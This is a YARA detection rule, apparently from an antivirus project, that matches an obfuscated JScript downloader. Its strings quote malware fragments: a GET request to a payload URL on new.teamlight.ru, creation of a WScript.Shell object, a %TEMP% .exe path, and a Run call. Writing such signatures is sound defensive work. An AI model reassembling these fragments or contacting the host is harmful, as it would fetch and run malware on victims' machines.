rule sig_20160330_a7ab72c6f54b0bddf91cbd3b5151d4ee {
  meta:
    description = "datamaliciousorder - file 20160330_a7ab72c6f54b0bddf91cbd3b5151d4ee.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "0010316cf8ff1c1617600565c535ccffe59ad0fd6de3a4bf86ffa275dab26991"

  strings:
    $s1  = "function DZ(JE, G1){Q = Q * 1; return JE - G1;};" fullword ascii
    $s2  = "A0[OS](\"GET\", \"http://new.teamlight.ru/si8svf\", false);" fullword ascii
    $s3  = "var S = function R() {return WScript[X0](\"WScript\"+\".Shell\");}(), P = 11;" fullword ascii
    $s4  = "if (A0[\"readystate\"] < 2 * 2) continue;" fullword ascii
    $s5  = "function X() {return S[\"ExpandEnvironmentStrings\"](\"%TE\"+\"MP%/\") + \"oPZ95PnxPKny.ex\" + \"e\";};" fullword ascii
    $s6  = "function AN(){return K + \"\";};" fullword ascii
    $s7  = "function G(Z){S[\"Run\"](Z, Q, Q);};" fullword ascii
    $s8  = "function H() {return ((IO == true) && (IO == SJ)) ? 1 : Q;};" fullword ascii
    $s9  = "function M(){return 22;};" fullword ascii
    $s10 = "function J(){return X0;};" fullword ascii
    $s11 = "function IT(G0) {var GT = (1, 2, 3, 4, 5, G0); return GT;};" fullword ascii
    $s12 = "return DZ(K0, MQ);" fullword ascii
    $s13 = "var WL = new this[\"Date\"]();" fullword ascii
    $s14 = "function OP()" fullword ascii
    $s15 = "}while (JQ);" fullword ascii
    $s16 = "IO = true; " fullword ascii
    $s17 = "var IO = false;" fullword ascii
    $s18 = "var SJ = false;" fullword ascii
    $s19 = "SJ = true; " fullword ascii
    $s20 = "} catch(WH){};};" fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}